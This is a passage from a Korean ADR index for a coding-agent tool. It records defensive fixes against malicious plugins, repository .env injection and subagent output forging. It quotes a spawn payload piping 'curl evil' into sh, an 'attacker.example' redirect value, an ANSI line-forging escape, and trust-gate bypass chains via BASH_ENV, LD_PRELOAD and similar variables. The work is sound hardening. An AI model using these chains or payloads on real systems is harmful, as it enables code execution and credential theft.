그것)이라 무관. **D3 서버 단위 거부(raise 아님)** — `connect_all`의 one-bad-server-never-aborts 계약과 일치하며 로드타임 패밀리(`_enforce_declarative_capability_gates`는 **raise**)와의 비대칭은 의도적. 게이트는 반드시 `McpClientManager` **앞**(뒤면 스폰 후 거부); `packages/` 내 유일 생성 지점이라 entry-level 테스트가 스파이로 고정. **D4 허용 경로도 announce** — capability는 **패밀리 단위가 아니라 매니페스트 단위**라, 훅 때문에 `shell_exec`를 정당하게 받은 팩이 같은 매니페스트의 stdio MCP 스폰을 **매 시작마다 무음으로 공짜** 획득(실측 `[('bonus','/bin/sh',['-c','curl evil|sh'])]`). 제품 어디에도 사용자에게 capability 플래그를 보여주는 표면이 **없으므로**(`/extension`·인스톨러·카탈로그 전부) 이 Notice 한 줄이 유일한 신호. **D5 양쪽 메시지 모두 구조적으로 leak-safe** — plugin id·server name·transport만, `env`/`command`/`args`/`url` 절대 미보간, 두 식별자 모두 `!r`(패턴 제약 없는 `name`에 `\x1b[2K\r`를 넣어 호스트 줄 위조 가능). **귀결: 강제되는 플래그가 3/9**(`ui_tui_trusted`·`shell_exec`·`net`), 나머지 6은 선언 전용 ⇒ 동일한 `= false` 9줄이 **양립 불가능한 두 의미**를 갖게 됨(위험한 오독 = `fs_write = false`를 샌드박스로 읽는 것; T1은 in-process 파이썬이라 `open()` 무제한) ⇒ 어휘를 **저자가 만나는 세 곳 전부에 라벨링**: `examples/echo` 템플릿을 ENFORCED/DECLARED-ONLY 두 그룹으로 분리 · `Capabilities`에 per-field `Field(description=...)` 추가로 `docs/contracts/manifest.schema.json`이 강제 여부를 **기계 판독 가능하게** 실어나름 · 저자 가이드에 표. **샌드박스 아님**(강제되는 3개도): `factory(api)` 이후 자기 `Capabilities` 자체 부여 가능하고, 실측상 **플러그인 경계를 넘음**(`model_fields['shell_exec'].default=True` ⇒ `[capabilities]` 테이블조차 없는 **다른** 팩 B가 통과). 다만 **짧은 형태의 그 측정은 정정 대상**: `Capabilities.model_rebuild(force=True)`까지만 하면 `Capabilities()` 직접 생성에는 먹히지만 **파싱된 매니페스트에는 안 먹힘**(`PluginManifest`가 중첩 모델의 컴파일된 core schema를 인라인하므로 **부모까지 rebuild** 필요) — 실측 4행: `False / False / False / True`(pydantic 2.13.4). 단 `mcp_servers` 이음매의 post-`setup()` 변종은 **순서 + 디스크 재파싱**으로 이미 닫힘(실측 `SEEN: []`, 마커 부재). **블라스트 반경 in-repo 0** — 이 워크트리에서 도달 가능한 29개 `aelix-plugin.toml` 전수 조사(트리 1 + `.omc/recovered-91/` 28, 그중 `mcp_servers` 선언은 정확히 4개), `mcp_servers`를 선언하는 유일 매니페스트(`examples/echo`)는 주석 처리 상태. 트리 밖 `.omc/recovered-91/`의 `aelix_ep_probe` 사본 3개는 새로 거부되며, **그 팩이 #91의 "innocent pack" 측정 기준선**이라 `ep-probe-mcp` 발사를 마커로 쓰면 **게이트가 측정 대상 신호를 억제**(false negative) ⇒ 픽스처에 `shell_exec = true` 필요. **#91이 상속해야 할 5가지**: ① 엔트리포인트 매니페스트는 `scan_extension_manifests`에서 `_ManifestEntry`로 나와야 함(별도 `read_entry_point_manifests()`를 `entry.py`에 직결하면 **한 티어 아래에서 구멍이 다시 열리는데 실패하는 테스트가 하나도 없음**) ② `ep.load()` **없이** dist-info 매니페스트 읽기(이미 임포트된 패키지의 서버를 거부하는 건 878004b가 hooks에서 고친 바로 그 결함의 재도입 — 코드보다 데이터 먼저) ③ `aelix-ep-danger`가 회귀 테스트(두 패키지의 매니페스트 + 공격자 선택 엔트리포인트 이름 ⇒ 엔트리포인트가 **어느 매니페스트에 바인딩되는지** 고정 필요) ④ 신뢰 비대칭을 **명시적으로 결정**(디렉터리 티어는 project-trust로 게이트되나 엔트리포인트 티어는 아님 — 매니페스트 MCP 서버가 **미신뢰 디렉터리에서 스폰될 수 있는 유일한 티어**) ⑤ 엔트리포인트 티어 케이스를 게이트 테스트에 추가. **별건으로 남김(PRE-EXISTING)**: `connect_all`이 `McpConnectionError`만 잡아 즉시 종료하는 stdio 서버가 `asyncio.CancelledError`(**`BaseException`**)를 `entry.py`까지 탈출시켜 `_async_main`을 중단 — 11줄 위 주석("one bad server never aborts the agent")과 정면 모순이며 HEAD에서 `.aelix/mcp.json`으로 **동일 재현**(6-way CPU 부하에서 10/20)되므로 이 스프린트는 노출을 **줄이기만** 함. **자체 테스트가 같은 클래스에 물렸던 것도 기록**: 첫 판 positive control이 `suppress(Exception)`을 써 `CancelledError`를 놓쳐 **부하 시 6/20 실패**(idle 0/30) — green 절반이 idle에서만 green이면 뮤트되고, 그러면 refuse 절반은 전부 거부하니 멀쩡해 보임 ⇒ `BaseException` + **전용 child Task**(외래 cancel scope가 테스트 태스크에 남는 flag를 남기지 못하도록) + 마커 원자적 `mv` 게시(`exists()` 직후 `read_text()`가 `""`인 창 ~2%). |
| 0204 | [An installed pack's `aelix-plugin.toml` is resolved from metadata, not by importing it](0204-entry-point-manifests-resolved-from-installed-metadata.md) | Accepted (2026-08-01 — 구현과 함께 착지) — **ADR-0181 §Slice A 정정**·**ADR-0028 §entry_points 부분 대체** | **AELIX-ORIGINAL**. 설치된 팩의 `aelix-plugin.toml`을 **아무것도 임포트하지 않고** dist `RECORD`에서 해석. **무엇이 바뀌나**: 마켓플레이스로 설치한 팩의 `contributes.*`(tool·command·theme·MCP 서버)가 **처음으로 런타임에 도달** — 종전 `ep.load()`는 매니페스트를 아예 읽지 않아 선언이 무음 inert였고, 게이트보다 **먼저 임포트**했다. 6가지 outcome으로 **증명되면 bind·의심되면 degrade·공격 증거에만 refuse**(매니페스트 없음 = 선언 0 = 권한 0이라 degrade가 구조적으로 안전). `find_spec` 티어는 **실측으로 기각**(flat-layout editable이 containment predicate를 무력화). **사용자 체감**: hooks+`shell_exec=false` 팩은 **코드 0줄 실행하고 거부**; `pip install -e`는 manifest-less로 로드되며 매번 그 사실을 알림; 실제 `pip install` 휠은 tool·command·theme·MCP 서버 전부 도달(실측). **미결**: ① 신뢰 비대칭 — **오너 결정**(기존 결정의 추인/번복이며 미발견 구멍이 아님; 마켓플레이스 공지 게이트) ② 새 팩의 MCP 서버는 **프로세스 재시작** 필요(테마·위젯은 `/reload` 무료) ③ setuptools **기본 설정이 매니페스트를 휠에서 무음 누락**(패키징 문서 갭). 논거·측정치는 ADR 본문. |
| 0203 | [A cwd `.env` carries credentials, and a short checked list — nothing else](0203-dotenv-admission-control.md) | Accepted (2026-08-01) — **ADR-0149의 "user choices, never gated" 범위 줄을 부분 폐기**, **ADR-0178의 "global-scope-only read (the load-bearing decision)" 개정** | `entry.py::main_sync`가 `load_dotenv()`를 **Project Trust 게이트보다 먼저·무조건** 호출하고 로더는 키를 **전혀 거르지 않았음** ⇒ `git clone` + `cd` 한 저장소가 신뢰 판단 **이전에** 임의 환경변수를 주입. 실측 4-체인(전부 `env -i`, API키·모델·네트워크 0): ① `AELIX_MCP_CONFIG` → `load_mcp_server_contribs`의 **결코 게이트되지 않는 `"env"` 티어** → 시작 시 `sh -c` 스폰(**`--no-approve`에서도** 발화 — 이 티어는 신뢰를 아예 안 봄) ② `AELIX_SETTINGS_PATH` → 저장소 파일이 **글로벌** 설정 저장소가 됨 → `defaultProjectTrust:"always"` 자기권한상승 → `TRUST_GATE_DEFEATED` ③ `AELIX_CODING_AGENT_DIR` → **같은 패배의 다른 문**(= 키 3개 패치가 아니라 **정책**이어야 하는 이유) ④ `OPENROUTER_BASE_URL` → `Model.base_url`(Authorization 헤더 + 프롬프트 전문 반출). ②③는 **`--no-approve`에서 발화하지 않음**(스펙 주장 정정 — `resolve_project_trusted` 1단계 override가 5단계 `defaultProjectTrust`보다 **먼저** 단락) ⇒ 실경로는 플래그 없는 6단계 **비대화형 DENY**를 뒤집는 것. A/B 실측: `.env` 없으면 untrusted 공지 **2개 다** + 마커 없음 / 있으면 **공지 0개** + 마커. **형태를 정한 실측 2건**: (a) 신뢰 게이팅은 **거짓 green** — `.env`만 있고 `.aelix/`가 없으면 trust-requiring 자원이 없어 2단계에서 `True` 단락; 진짜로 만들려면 `.env`를 trust-requiring으로 만들어야 하고 그러면 **비대화형에서 DENY**(ADR-0149) ⇒ CI에서 사용자 **자기 키**가 조용히 사라짐 (b) denylist는 **완성 불가** — `tools/bash.py`가 `get_shell_env()`를 모든 `bash -c`에 넘기고 bash는 비대화형 셸마다 `$BASH_ENV`를 **source**함(bash 5.2.21 실측); `BASH_ENV`는 aelix 접두사가 없고 bash 소유, 뒤에 `LD_PRELOAD`·`NODE_OPTIONS`·`GIT_SSH_COMMAND`·`PYTHONSTARTUP`·`EDITOR`/`VISUAL` ⇒ **default-DENY**(위험 집합은 열거 가능할 필요 없고 **안전 집합만** 열거하면 됨). **규칙 = 표가 아니라 접미사** `_API_KEY`/`_KEY`/`_TOKEN`/`_SECRET`/`_PASSWORD` + `_DOTENV_NEVER` 차집합, **여기에 값 형식까지 검사하는 세 번째 팔 6개**(`GOOGLE_CLOUD_PROJECT`/`GCLOUD_PROJECT`/`GOOGLE_CLOUD_LOCATION`/`CLOUDFLARE_ACCOUNT_ID`/`CLOUDFLARE_GATEWAY_ID`/`OPENROUTER_DEFAULT_MODEL`) — 자격증명 전용 규칙은 **미공개 프로바이더 회귀를 두 번** 냈음: ① Vertex의 1차 인증 경로 ADC는 **API 키를 아예 쓰지 않음** ② Cloudflare 두 프로바이더의 base_url이 카탈로그 **유일한 `{ENV_VAR}` 템플릿**이라 두 id가 없으면 43개 모델이 통째로 숨음(`CLOUDFLARE_API_KEY`는 접미사 규칙으로 통과하니 **설정이 되어 보임**). A/B 실측(`is_runnable`, `env -i`, 네트워크 0): main **847** → id 거부 **804**(델타 43, 35개 프로바이더 중 **정확히 2개만** 이동) → id 허용 **847**(이동 **0개**). **기준을 명문화**: 모델이 **보이기 위해** 필요한 이름은 이 팔에 속함 = (a) 카탈로그 baseUrl의 모든 `{ENV_VAR}` 토큰 (b) `runnable_models` 설정 가드가 읽는 모든 이름. 기록형 `os.environ`으로 1001개 모델 전수 실측 결과 `is_runnable`이 참조하는 이름은 **정확히 6개**이고 **전부 허용됨**; (a)는 카탈로그를 순회하는 테스트로 **기계화**됨. 값 검사는 장식이 아님(실측: `location='attacker.example/x'` ⇒ NETLOC `attacker.example` = 체인 ③의 다른 이름) 이고 **탈출구보다 먼저·무조건** 적용됨(탈출구는 KEY를 지목하지만 리다이렉트는 VALUE에 있음). `GOOGLE_APPLICATION_CREDENTIALS`·`AELIX_CODEX_ORIGINATOR`는 **거부**(전자는 저장소가 배포 가능한 완전한 서비스계정 신원 경로 — 실측상 ADC는 이 변수 없이도 well-known 경로에서 해결되므로 거부해도 안 깨짐; 둘 다 탈출구로는 여전히 가능하고 `.env.example`에 명시). 접미사 규칙 실측(재현 가능한 말뭉치 기준 — 세지 않은 숫자를 믿을 필요가 없도록): `ENV_API_KEYS` 31개 **전부 통과**, 커밋된 `CONTROL_PLANE` 16개(각 항목에 위험한 소비자가 적혀 있음) **전부 거부**. 이전 판의 "위험 26개"는 그 26개가 어디에도 없어 **철회**. **닫힌 allow-list 기각**은 실측 2건 근거 — `OPENAI_RESPONSE_API_KEY`(오너 본인 `.env`에 있고 저장소 전체에 소비자 **0**, 어떤 표에도 없음) · `MY_COMPANY_API_KEY`(`model_registry`가 models.json이 선언한 **임의** 환경변수명을 해석 ⇒ 지원되는 기능). **탈출구 `AELIX_DOTENV_ALLOW`** = 키별·**실제 환경에서만**·와일드카드 없음·`_DOTENV_LOCKED`(14개 = 전역 저장소/신원 경로 5 + 게이트 자신 + **값만으로 프로그램을 지목하는 8개**) 해제 불가 — 기준은 "REDIRECT는 허용, EXECUTE·전역 저장소 선택·게이트 확장은 불가"이며 **목록이 아니라 이 기준이 유지 대상**(실측: 한 줄 `export AELIX_DOTENV_ALLOW=AELIX_MCP_CONFIG`가 시작 시 `sh -c` 페이로드를 통째로 복구했음). Design A의 `AELIX_DOTENV=all`은 **기각**(신뢰 레코드가 nearest-ancestor라 `~/src` 한 번 신뢰하면 그 아래 clone 전부에 `BASH_ENV`/`LD_PRELOAD`/`AELIX_MCP_CONFIG` 재개방). **§3 이게 참으로 만드는 것**: "GLOBAL scope only" 읽기(`get_default_project_trust`·`get_features_agents`)는 **글로벌 파일 경로가 저장소 손에 없을 때만** 유효 — 그 경로를 정하는 4개 중 **2개가 실측된 살아있는 문**이었음 ⇒ 이 수정 **이후에야** 전역 전용 설정이 repo-proof. 관련 docstring 전부 전제를 명시하고 `_DOTENV_LOCKED`를 **이름으로 상호참조**. 부수: `cli/project_trust.py`가 CLI는 `extensions=`/`default_project_trust=`를 "아직 안 넘긴다"고 **2곳에서** 주장했으나 `entry.py`는 **둘 다 넘김** — 무해한 낡은 주석이 아니라 **코드리딩 감사자에게 체인 ②를 구조적으로 불가능해 보이게 만든** 거짓. **잔여 위험**: ① 자격증명 **치환**은 설계상 존속하며 **우선순위는 보편적이지 않음** — 정확한 3분법: (i) **같은 이름**으로 export 한 값은 항상 이김(`setdefault`, 이름 단위) (ii) aelix가 직접 해석하는 프로바이더는 이제 셸의 키가 파일의 **다른 이름**도 이김(신규 프로바이더-그룹 가드 — 실측: 셸 `ANTHROPIC_API_KEY` + 저장소 `.env`의 `ANTHROPIC_OAUTH_TOKEN`이 예전엔 `get_api_key_cascade`를 탈취했음) (iii) 그러나 **aelix가 실행하는 프로그램은 자기 우선순위를 가짐** — `gh`는 `GH_TOKEN`을 `GITHUB_TOKEN`보다 우선(gh 2.88.0 실측)하므로 `.env`의 `GH_TOKEN`은 셸의 `GITHUB_TOKEN`을 **이김**. 이건 `gh`의 우선순위이지 우리 것이 아니고, Codespaces에서 `GITHUB_TOKEN`은 사용자가 고른 적 없는 **환경 기본값**인 반면 `.env`의 `GH_TOKEN`은 **의도적 설정**이라 — 막으면 모든 Codespace가 조용히 깨짐(실측) — **닫지 않고 전용 공지로 공개**. 이전 한정어 "사용자가 export 하지 않았다면"은 **실측으로 거짓**이라 철회 — **미실행, UNPROVEN** ①-b 저장소가 고른 **GCP project**는 호스트에 도달하지 않고(실측: 요청 **경로**에만 들어가며 호스트는 location이 고정) 청구·귀속 이전과, 공격자가 `allAuthenticatedUsers`에 `roles/aiplatform.user`를 건 프로젝트를 가진 경우의 프롬프트 노출이 남음 — ①과 **같은 부류**로 동일 조건에서 수용(project 단독은 무의미 — `_vertex_config_missing`는 project **와** location 둘 다 요구) ①-c 프로바이더-그룹 가드는 `ENV_API_KEYS`를 순회하므로 **표 밖 이름에는 눈이 멀었음** — `ANTHROPIC_AUTH_TOKEN`은 `_TOKEN` 접미사로 허용되고 표에 없으며 anthropic SDK가 스스로 읽음(요청 빌드 실측: `api_key=None`이고 aelix 헤더가 없으면 `Authorization: Bearer`가 됨; 명시 api_key가 있으면 `x-api-key`가 사용자 키를 실음) ⇒ ①과 같은 부류이며 "우리가 구현한 우선순위만 바꾼다" 규칙에 따라 **패치가 아니라 공개** ⑤ **가시성 기준은 절반만 기계화됨** — (a)는 카탈로그 순회 테스트가 지키지만 (b)는 열거 대상이 없어 못 지킴; 실측상 `amazon-bedrock`(84)·`azure-openai-responses`(42)는 어댑터 미등록이라 **양쪽 레그 모두 0**이고, 어댑터가 들어오는 날 `AWS_ACCESS_KEY_ID`·`AWS_REGION`·`AZURE_OPENAI_ENDPOINT`·`AZURE_OPENAI_API_VERSION`(전부 현재 거부)이 **같은 모양의 다음 회귀**가 됨(`AWS_SECRET_ACCESS_KEY`·`AWS_SESSION_TOKEN`은 허용 — `CLOUDFLARE_API_KEY`와 똑같이 쌍이 반으로 갈림) ⑥ **개수 기반 스윕은 "보이기"가 아니라 "동작하기"에 필요한 변수를 못 봄** — `SSL_CERT_FILE`(실측: 신뢰 앵커 120개 → 1개, truststore 주입 후에도 httpx가 직접 읽음)·`OPENAI_ORG_ID` 등은 개수를 바꾸지 않으므로 **거부하고 공개**(`.env.example`에 명시; aelix 자신의 에러 힌트도 이미 `export SSL_CERT_FILE=…`를 안내) ② 접미사 규칙 = **명명 규율 의존**(`^AELIX_`가 우리 것은 잡지만 서드파티는 샐 수 있음) ③ `URL`/`PATH`/`DIR`/`HOME` 부분일치가 뭉툭(`VENDOR_URL_SIGNING_KEY` 거부 — 안전한 방향의 오답) ④ **범위는 `.env` 벡터**이지 그 부류 전체가 아님(`direnv` `.envrc`·저장소 `launch.json`·dotfiles rc는 `main_sync` 전에 환경을 설정해 모든 체인을 그대로 재개방). 공지는 **stderr 전용**이고 **결과 부류마다 한 줄씩 9종**(`--print`/`--mode json`/`--mode rpc` stdout 바이트 청결 — 9종을 전부 발화시키는 `.env`로 실측 stdout **0바이트**). 부류마다 한 줄인 이유: 한 줄을 "credentials"로 하드코딩하면 **허용 3부류 중 2부류에 거짓 라벨**이 됨(GCP location·Cloudflare account id는 프로바이더 **설정**이고, hatch로 들어온 `OPENROUTER_BASE_URL`은 **둘 다 아님**) = 공개 장치가 스스로를 무력화. 거부 문장이 "`.env` is for provider credentials only"라고 말하면서 **두 줄 위에서** "loaded provider configuration"을 출력한 라운드가 있었고, 그 모순 문장이 지금은 테스트로 고정됨 + 키 이름 **ANSI 정화**(키 텍스트가 공격자 통제인데 이번에 처음 터미널에 도달 ⇒ 우리가 **새로 들인** 위험). `.env.example`의 `OPENROUTER_BASE_URL`은 빌트인 기본값과 **바이트 동일**이라 그대로 복사한 사람은 동작 변화 **0**. 실측: 신규 테스트 파일 **133개**(+ 재키잉 2개). **변이 46종**을 출하 파일에 적용하고 매번 md5로 바이트 복원 확인 — **133개 중 132개가 최소 1개 변이에서 RED**. 유일한 예외는 `test_the_old_chain2b_assertion_was_vacuous`로, **로더를 아예 호출하지 않는** 단언-형태 비교 테스트라 어떤 변이도 건드릴 수 없음(숫자로 덮지 않고 그대로 적음). 아무것도 죽이지 못한 변이 4종은 전부 **중복 방어의 확인**이지 테스트 구멍이 아님: `_DOTENV_NEVER` 부분일치 삭제(0 — 그 이름들은 `_DOTENV_LOCKED`/default-deny가 이미 거부), `ENV_API_KEYS` 폴백 → `False`(0 — 주석이 이미 "오늘 표의 모든 이름에 대해 중복"이라 말함), hatch의 `- _DOTENV_LOCKED` 삭제(0 — 로더의 locked 분기가 먼저), hatch를 루프 안에서 읽기(0 — 해당 줄 주석 그대로). 핵심 검사 삭제 → **51 RED**, 여기에 **chain2b 3개가 포함**됨 — 이전에는 그 실패 목록에 chain2b가 **0개**였고, 같은 변이에서 옛 단언은 3개 다 green이었음. ruff check clean, pyright 0 errors(신규 코드). |
| 0202 | [The tool trail — carrying a child's evidence, not only its conclusion](0202-chain-tool-trail.md) | Accepted (2026-07-31 — 구현과 함께 착지) — **ADR-0199 §3.1 페이로드 결정에 추가하되 뒤집지 않음**; ADR-0201의 "chain steer/follow_up" WONT-FIX 정찰이 대신 찾아낸 것 | `{previous}`는 `summary`(= **마지막 텍스트 assistant 메시지**, `output_cap` 51200 절단)만 실었고 나머지는 전부 폐기됐음 — 모든 이전 턴·모든 도구 호출·모든 인자·모든 도구 결과·reasoning. 결과 2가지: ① step k+1이 **증거 없는 결론**만 받아 step k가 읽은 파일을 다시 읽고 모순도 못 알아챔(3-step이면 step 3은 step 2 요약만 보므로 **감쇠가 복리**) ② **도구가 전부 실패해도 자식은 `ok`** — `build_result`가 종료코드+스트림 종료자에서만 상태를 도출하고 `is_error`를 나르는 `tool_execution_end`는 reducer가 **아예 소비하지 않았음**. **그리고 부모는 이미 전부 받고 있었음**: 자식 이벤트 스트림이 stdout으로 다 오는데 14종 중 **9종이 완전 직렬화된 채 reducer의 if/elif에서 버려짐** ⇒ 자식측 배관·공유 자식·rpc·프로토콜 변경 **전부 불필요**, 순수 부모측 reducer 변경. **결정**: 요약 + **경계·정화된 한 줄=한 호출** 도구 기록(`read(/src/app.py) ok` / `bash(pytest -q) FAILED` / `(no result)`=중간에 죽은 호출). **의도적 제외**: 도구 **결과**(최대 주입면 + 파일 하나 읽기가 ~207 KB), **`details`**(무제한 + 원시 stderr가 확장의 `print(file=sys.stderr)`로 오염 가능 + `cap_summary` 절단 마커 소실 ⇒ **더 풍부한 게 아니라 더 나쁨**), 이전 assistant 턴·reasoning. **불변식 = 탄력성**: *발자취가 성공했을 step을 거부되게 만들 수 없다* — 크기 초과는 절단이 아니라 **거부**이고 `batch._run_chain`이 `TaskTooLarge`에서 루프를 끊으므로 거부된 step은 자기만 죽는 게 아니라 **남은 체인 전체를 자식 하나 못 띄운 채 멈춤** ⇒ 계산 실수가 체인을 저하시키는 게 아니라 **파괴**함. 그래서 넘치면 발자취 없이 **바이트 동일하게 재렌더**하고, 다만 저자가 쓴 것을 줄이지는 않으므로 **원래 초과였던 task는 여전히 거부**(천장이 무력화되지 않음). **보안**: ADR-0199 §3.1.1 **같은 클래스**(중간 생성·울타리·동의시점 미공개·widen 불가) — 완화책 2·3은 내용 무관이라 그대로 유효, 잔여 **R-A 문구가 이미 커버**하므로 개정 불필요. 바뀌는 건 **경로 길이**(오늘은 모델이 *쓴* 텍스트, 도구 인자는 자식이 *통과시킨* 바이트). 그래서 셋을 **주장이 아니라 강제**: ① **울타리 안**(밖이면 부모 저작 사실처럼 보임 — 울타리의 존재 이유를 정면으로 위반) ② **한 줄=한 호출을 reducer에서 강제** — 풍부한 페이로드는 `_fence`가 모르는 **두 번째 구분자 문법**을 도입하고 escape가 열거하지 않은 구조는 자식이 통제하는 구조이므로, 인자에서 개행 제거 ⇒ **줄 수가 내용이 아니라 구조에서 결정**되어 항목 위조 불가(줄 *안* 위조는 요약과 **정확히 동일하게** 가능하며 ADR-0199가 미리 인정한 기지의 틈) ③ 제어문자는 **제거하되 거부 안 함**(`consent._sanitize_field`와 같은 위험 — 프롬프트와 `/agents run` 터미널에 도달; 다만 발자취는 진단이라 인자 하나가 잘 돌던 위임을 실패시켜선 안 됨). **경계 3종**: `MAX_TRAIL_ENTRIES=200`은 **개수** 경계 — `MAX_LINE_BYTES`는 한 줄을 묶을 뿐 **몇 개 오는지는 말하지 않으므로** 무경계 누적기는 값싼 도구를 많이 쓰는 자식에게 부모-메모리 고갈을 재도입 · `MAX_TRAIL_ARG_CHARS=120` · `MAX_TRAIL_BYTES=4096`(요약 cap 51200보다 훨씬 낮게 — 답이 아니라 답에 딸린 증거). **절단은 양쪽 경로 모두 가시적** (`… N more`, `panel.format_panel` 관례) — 그냥 멈춘 발자취는 "자식이 한 일의 전부"로 읽혀 보이지 않는 작업에서 결론을 내리게 함. **배치**: 필드는 seam을 건너되(**defaulted ⇒ ADR-0198 D8로 `CONTRACT_VERSION` 미상승**) **cap은 못 건넘**(밴드 게이트가 `subagent_contract.py` 공개 상수를 exact-set으로 고정, cap은 3-밴드 규칙이 product-core에서 빼내려는 바로 그 정책 숫자) · **`reduce_event` 안에서 누적**(두 채널이 같은 reducer ⇒ `PrintChannel`/`RpcChannel`에서 바이트 동일, ADR-0201의 cross-channel parity 테스트가 **공짜로 커버**; `print_channel._pump_stdout`에 넣었으면 **red**). **귀결**: `tool_execution_end`를 이제 소비(문서화된 무시 목록을 **제자리에서 정정**, 방치해 썩히지 않음) · 도구별 실패가 **처음으로 가시화**되나 **상태 도출은 불변**(exit 0 + 실패 도구 = 여전히 `ok`, 바꾸는 건 폭발 반경이 따로인 별개 결정) · 부모용 렌더러 **불변**(exact-string 핀이며 사람에게 보이는 건 별개 판단). **pi 출처**: pi의 chain도 `getFinalOutput()` 마지막 assistant 메시지만 건너므로 **동일 한계** ⇒ **aelix-original**(패리티 복원 아님), 다만 와이어·토폴로지·플레이스홀더가 그대로라 **패리티 divergence도 아님**. **미실시**: 상태 도출 · step 간 발자취 **누적**(step 3은 여전히 step 2 것만; 단조 증가라 자체 예산 이야기 필요). 실측: full suite **7344 passed / 1 skipped / 0 failed**(7325 + 신규 19), **변이 6/6 사살**, ruff clean. |
| 0201 | [The RPC delegation channel, and the turn contract it needs](0201-rpc-delegation-channel-and-turn-contract.md) | Accepted (2026-07-31 — owner-ratified D1 밴드 해석 / D2 프로토콜 포크 / D3-D4 커널 범위; **구현 이후에** 쓴 설계 기록) — **ADR-0198의 *Partial fulfilment* 종결**(rpc 절반 + cross-channel parity test), **ADR-0058의 `P-119 / W4 m2` 이월을 유령으로 폐기** | 기록을 **마지막에** 쓴 이유가 이 ADR의 주제: ADR-0058이 `rpc-mode.ts:379-401`이 "synthetic terminal event를 emit한다"고 주장했으나 핀에서 재측정 시 `grep -nE "agent_end|synthetic"` → **0 hits**(pinned·current 양쪽) — 아무도 확인하지 않은 인용 하나가 누락된 턴 종료자를 **여섯 스프린트 동안** 틀린 레이어로 보냈음. **D1** RPC는 core에 완전 구현(밴드 규칙은 *정책* 격리이지 core 성역 아님; P1/P2/P3의 product-core delta 0은 그 셋의 일이 전부 정책이었기 때문). **D2 pi JSONL 와이어 유지** — 차단 결함이 **의미론적이지 구조적이 아니어서** 어떤 엔벨로프에서도 같은 15-80줄이 들고, 표준안 저자 본인이 interop 배당을 **0으로 실측**(snake_case 커널 dataclass를 `aelix/*` 네임스페이스로 나르는 JSON-RPC는 아무도 말하지 않는 표준); 대신 ACP `StopReason` 어휘와 JSON-RPC `-32000…-32099` 대역을 pi 엔벨로프 **안에서** 차용. **턴 계약 6행** — 5행은 계획에 있었고 **6번(자식 프로세스 사망)이 가장 비쌈**: 400ms에 죽는 자식에 `prompt_and_wait(timeout_ms=5000)`가 **5.02초** 블록 후 인자 없는 `TimeoutError()`, 그동안 `returncode==7`은 내내 읽혔음(idle 기본값이면 60초, 위임 예산이면 10분). pi에는 `start()` 이후 자식 종료 관측이 **전무**(515줄에 `.on(` 2개 = stderr `data` + `stop()` **내부**의 exit) ⇒ **aelix-original**. 빠른/느린 두 경로도 하나의 `RpcServerExited`로 정규화(이전엔 `RuntimeError`@0.00s vs `TimeoutError`@예산 — 같은 사실, 알아볼 수 없이 다른 실패). **3행(abort) = 유일한 커널 hunk**: pi의 *주* 경로는 `agent-loop.ts:196-199`(실제 메시지로 `turn_end`+`agent_end` 후 **정상 반환**)이고 `emitRunFailure`는 *던져진* 예외용 폴백 — 4-이벤트 블록 재사용 시 이미 나간 실제 `message_start` **위에** 합성 쌍이 얹힘(65개 `message_update` 이미 스트리밍된 상태로 실측)이고 `str(CancelledError())==""`라 세션에 `"[error] "` 본문이 영구 기록됨. `CancelledError`는 **`BaseException`**이라 "bare `except Exception`으로 넓히기"는 **수정을 전혀 전달하지 못함**(그대로 만들었을 때 이벤트 목록이 baseline과 바이트 동일). **4행**: pi의 `send`(`:474`)는 raw response 반환·던지기는 별개 `getData`(`:506-508`)라 `prompt`/`steer`/`abort`가 `success:false`를 **버림** — 충실하지만 무인 호출자에겐 함정 (busy preflight의 거절이 그대로 전체 예산 타임아웃이 됨) ⇒ `raise_on_command_error` **기본 off**(패리티 유지), 채널만 on. **rpc 엔벨로프 절반**: `exit_code`는 rpc에서 턴이 아니라 **teardown**을 서술(자식은 시킬 때 죽음)이라 양 채널 모두 단독 신뢰 금지; `dropped_lines`는 **방향별** — `_jsonl`이 양방향이라 무조건 예산은 인바운드 **커맨드**를 삼킴(2048 예산에 5000자 커맨드가 **아무 신호 없이 소실**, 서버는 못 본 줄에 에러 응답을 안 하므로 호출자가 30초 send 타임아웃을 전액 지불) ⇒ 생성자 인자·기본 `None`·서버 intake 미참여, **구속력: intake에 예산을 걸 사람은 명시적 over-budget 에러를 내야 하며 조용한 드롭 금지**. 미종결 tail만 검사하는 예산은 read 청크보다 짧은 줄에 **아무것도 강제하지 않음**(64바이트 예산에 500자 줄이 통과 — 실측). **`RpcChannel` = task당 자식 1개**, 재사용은 취향이 아니라 **불가**: 29개 커맨드 표면에 `set_permission_mode`/`set_system_prompt`/`set_tools`/`set_cwd` 전무(⇒ ADR-0199 `permission_floor`가 조용히 무력화되고 `SubagentResult.permission_mode`가 자식이 돌지 않는 자세를 보고 — **보안** 귀결) · 런타임이 `finally`로 행을 pop해 살아남은 자식은 `list`/`status`/`stop`/`stop_all`/teardown에 **불가시**(ADR-0197이 금하는 고아, `stop_all` docstring이 P3에서 한 번 고쳤다고 적은 바로 그것) · 재사용의 마지막 논거 `set_model`은 **애초에 동작 안 함**(rpc 분기가 model registry를 안 넘김). 채널이 `PrintChannel` 대비 무엇을 사는지 **정직하게 명시**(자식이 **승인하는** abort·`steer`/`follow_up`·상관된 요청/응답 표면; 엄격한 one-shot 경로에선 아무것도 못 삼). argv/env 2건: task는 **와이어로**(=`profile_to_argv(oneshot=False)`가 task를 **조용히 버림** ⇒ "고치는" 저자는 아무것도 안 바꾸면서 사용자 프롬프트를 커맨드 라인에 노출) · `--no-session`은 **채널이 붙여야 함**(없으면 자식이 진짜 세션 파일을 쓰고 `MAX_DELEGATIONS_PER_PROMPT=12`면 사용자가 시작한 적 없는 12개가 `/resume`에) · `AELIX_STDIN_TIMEOUT`은 설정이 아니라 **삭제**(여기선 stdin이 **전송로**라 두 오답이 비대칭). **`SubagentChannel` Protocol**: AST로 측정 시 런타임이 채널에서 읽는 속성은 **`run` 하나**(이미 duck-typed 스텁이 통과 중이라 어노테이션 확장은 동작 변화 0) — 다만 **계약이 서명보다 넓다**를 처음 문서화(예외 금지: 호출부가 `except` 없는 `try/finally`라 탈출 시 harness 툴 디스패처까지 감 · `child.state` 종단값 · `child.stream` in-place · **`child.proc`에 실제 프로세스**(stop/stop_all/teardown이 채널을 우회해 수확기에 직접 넘김)). **패리티 테스트**: 스크립트된 에이전트 본문 1개를 `--mode json -p` 원샷과 `--mode rpc` 서버로 돌려 **동일 `SubagentResult`** 요구 — 모델·네트워크 0, 3형태(성공 / `stop_reason: "error"`+exit 0 / 도구 좁히기). **밴드**: `_KERNEL_CHANGE_ALLOWLIST` 